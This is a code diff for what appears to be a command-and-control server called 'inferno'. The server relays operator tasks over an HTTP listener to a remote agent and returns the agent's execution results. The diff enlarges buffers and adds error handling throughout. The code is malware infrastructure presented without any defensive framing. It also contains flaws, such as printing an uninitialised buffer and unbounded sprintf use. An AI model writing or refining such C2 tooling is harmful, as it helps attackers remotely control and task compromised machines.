@@ -52,13 +52,10 @@ int main() {
 
         while (1) {
             //receive from client
-            char input[1024];
+            char input[2048];
             printf("Received from client: %s\n", input);
-            int inferno_receive = recv(inferno_accept, input, sizeof(input), 0);
-            if (inferno_receive == 0) {
-                 puts("Socket closed by peer");
-                 break;
-            }
+            if (recv(inferno_accept, input, sizeof(input), 0) == -1)
+                error("Error receiveing from client");
 
             char *status;
             int http_listener_accept;
@@ -85,27 +82,30 @@ int main() {
 
             //handle all client/agent communications
             while (session) {
-                char inside[1024];
+                char inside[2048];
                 puts("==========START PAYLOAD==========");
 
                 //receive from client
-                recv(inferno_accept, inside, sizeof(inside), 0);
+                if (recv(inferno_accept, inside, sizeof(inside), 0) == -1)
+                    error("Error receiving from client");
                 printf("Receiving from client:\n%s\n", inside);
 
                 //transfering (receiving/sending to agent)
                 executed = http_transfer(http_listener_accept, inside);
                 
-                char response[1024];
+                char response[2048];
                 sprintf(response, "%s\r\n", executed); 
                 
                 //sending to client
-                send(inferno_accept, response, sizeof(response), 0);
+                if (send(inferno_accept, response, sizeof(response), 0) == -1)
+                    error("Error sending to client");
                 printf("Sending to client: %s\n", response);
                 puts("===========END PAYLOAD===========\n");
             }
             //sending to client
             printf("Sending to client: %s\n", input);
-            send(inferno_accept, input, sizeof(input), 0);
+            if (send(inferno_accept, input, sizeof(input), 0) == -1)
+                error("Error sending to client");
         }
 
         // close HTTP accept
@@ -142,14 +142,12 @@ int http_listener(int http_listener_socket) {
     
     //bind http
     printf("Binding http listener...\n");
-    int http_listener_bind = bind(http_listener_socket, (struct sockaddr *) &http_listener_address, sizeof(http_listener_address));
-    if (http_listener_bind == -1)
+    if (bind(http_listener_socket, (struct sockaddr *) &http_listener_address, sizeof(http_listener_address)) == -1)
         error("Binding HTTP failed");
 
     //listen http
     printf("Listening...\n");
-    int http_listener_listen = listen(http_listener_socket, 0);
-    if (http_listener_listen == -1)
+    if (listen(http_listener_socket, 0) == -1)
         error("Failed listening");
 
     //accept http
@@ -163,12 +161,14 @@ int http_listener(int http_listener_socket) {
 
 char *http_transfer(int http_listener_accept, char *task) {
      //sending task to agent
-     send(http_listener_accept, task, 1024, 0);
+     if (send(http_listener_accept, task, 2048, 0) == -1)
+         error("Error sending to agent");
      printf("Sending to agent:\n\n%s\n", task);
 
      //receiving egent execution
-     static char executed[1024];
-     recv(http_listener_accept, executed, sizeof(executed), 0);
+     static char executed[2048];
+     if (recv(http_listener_accept, executed, sizeof(executed), 0) == -1)
+         error("Error receiving from agent");
      printf("Received from agent: %s\n", executed);
 
      //return client execution
@@ -185,13 +185,11 @@ void networking(int inferno_socket) {
 
     //bind tcp
     printf("Binding socket to c2 address...\n");
-    int inferno_bind = bind(inferno_socket, (struct sockaddr *) &c2_address, sizeof(c2_address));
-    if (inferno_bind == -1) 
+    if (bind(inferno_socket, (struct sockaddr *) &c2_address, sizeof(c2_address)) == -1)
         error("Binding socket failed");
 
     //listen tcp
     printf("Listening to %s:%d\n", IP, PORT_TCP);
-    int inferno_listen = listen(inferno_socket, 0);
-    if (inferno_listen == -1) 
+    if (listen(inferno_socket, 0) == -1)
         error("Listening failed");
 }
